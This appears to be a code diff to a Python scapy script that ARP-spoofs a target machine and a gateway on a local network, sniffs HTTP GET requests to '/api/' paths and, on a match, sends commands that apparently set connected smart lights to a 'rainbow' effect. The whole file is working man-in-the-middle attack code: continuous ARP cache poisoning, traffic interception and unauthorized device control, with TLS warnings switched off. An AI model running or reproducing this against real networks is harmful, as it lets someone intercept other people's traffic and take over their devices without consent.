@@ -1,7 +1,16 @@
+import urllib3
+import light_control as lc
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
 from scapy.layers.http import HTTPRequest
-from scapy.sendrecv import sniff
+from scapy.sendrecv import sniff, srp, sendp
+
+target_ip = "192.168.1.5"
+gateway_ip = "192.168.1.247"
+interface = "Wi-Fi"
+stop_sniffing = [False]
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def arp_spoof(target_ip, spoof_ip, interface='YOUR_INTERFACE'):
@@ -19,29 +28,34 @@ def get_mac(ip):
 def sniff_packets(interface='Wi-Fi'):
     def process_packet(packet):
         if packet.haslayer(HTTPRequest):
-            # Check if it's an HTTP GET request
-            if packet[HTTPRequest].Method.decode() == 'GET':
-                # Check if the Path starts with '/api'
-                if packet[HTTPRequest].Path.decode().startswith('/api'):
-                    print("[*] HTTP GET Packet Captured with URI starting with /api:", packet.summary())
+            http_layer = packet[HTTPRequest]
+            if http_layer.fields['Method'] == b'GET' and http_layer.fields['Path'][:5] == b'/api/' and len(
+                    http_layer.fields['Path']) > 5:
+                if http_layer.fields['Path'][5:6] != b'/':
+                    print(f"Detected a GET request to {http_layer.fields['Host'].decode()}{http_layer.fields['Path'].decode()}")
+                    initiate_rainbow(f"https://{gateway_ip}{http_layer.fields['Path'].decode()}")
 
     print("Starting packet sniffing...")
-    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80")
+    sniff(iface=interface, store=False, prn=process_packet, filter="tcp port 80",
+          stop_filter=lambda x: stop_sniffing[0])
 
 
-# Use the IP addresses relevant to your network
-target_ip = "192.168.1.5"
-gateway_ip = "192.168.1.247"
-interface = "Wi-Fi"
+def initiate_rainbow(url):
+    lights = lc.retrieve_lights(url)
+    lc.process_lights(url, lights)
 
-# Start the packet sniffer in a separate thread
-sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
-sniffer_thread.start()
 
-try:
-    while True:
-        arp_spoof(target_ip, gateway_ip, interface)
-        arp_spoof(gateway_ip, target_ip, interface)
-        time.sleep(10)
-except KeyboardInterrupt:
-    print("ARP spoofing stopped.")
+def main():
+    sniffer_thread = threading.Thread(target=sniff_packets, args=(interface,), daemon=True)
+    sniffer_thread.start()
+    try:
+        while True:
+            arp_spoof(target_ip, gateway_ip, interface)
+            arp_spoof(gateway_ip, target_ip, interface)
+            time.sleep(10)
+    except KeyboardInterrupt:
+        print("ARP spoofing stopped.")
+
+
+if __name__ == "__main__":
+    main()
